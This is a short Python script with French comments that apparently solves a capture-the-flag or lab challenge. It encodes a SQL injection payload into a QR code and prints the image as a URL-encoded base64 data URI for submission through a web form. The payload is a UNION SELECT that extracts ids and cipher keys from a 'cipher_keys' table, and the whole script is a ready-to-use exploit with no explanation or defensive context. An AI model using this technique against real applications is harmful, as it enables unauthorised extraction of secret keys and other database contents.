import qrcode
import base64
import json
import urllib.parse
from io import BytesIO
 
# 🔹 Mets ici ce que ton QR doit contenir
data = json.dumps({"uid": "-1 UNION SELECT NULL,NULL,GROUP_CONCAT(CONCAT(id, ':', cipher_key) SEPARATOR ' | '),NULL  FROM cipher_keys -- -"})

# 🔹 Génération du QR
img = qrcode.make(data)

buffer = BytesIO()
img.save(buffer, format="PNG")
 
# 🔹 Conversion en Base64
b64 = base64.b64encode(buffer.getvalue()).decode()
 
 
# 🔹 Encodage pour application/x-www-form-urlencoded
encoded = urllib.parse.quote("data:image/png;base64," + b64)

print("\n👉 COPIE TOUT CE QUI EST EN DESSOUS 👇\n")
print(encoded)
 